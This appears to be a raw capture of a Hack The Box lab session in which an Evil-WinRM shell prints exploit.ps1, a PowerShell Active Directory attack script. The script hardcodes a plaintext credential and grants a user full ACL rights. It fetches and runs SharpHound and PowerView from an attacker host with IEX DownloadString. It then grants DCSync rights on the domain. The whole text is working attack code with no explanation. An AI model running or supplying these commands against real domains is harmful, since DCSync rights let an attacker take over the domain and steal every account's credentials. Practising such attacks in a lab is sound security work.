@@ -1,0 +1,20 @@
+Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type exploit.ps1                                                                          
+Import-Module 'C:\Users\svc-alfresco\Documents\PowerView.ps1'                                                                              
+                                                                                                                                           
+                                                                                                                                           
+$p = ConvertTo-SecureString 'Password123' -AsPlainText -Force                                                                   
+$c = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\kola', $p)                                                
+                                                                                                                                           
+Add-DomainObjectAcl -Credential $c -TargetIdentity kola -Rights All 
+
+
+
+
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.144:8000/SharpHound.ps1')
+
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.144:8000/PowerView.ps1')
+
+
+net group "EXCHANGE WINDOWS PERMISSIONS" 
+
+Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity kola -Rights DCSync
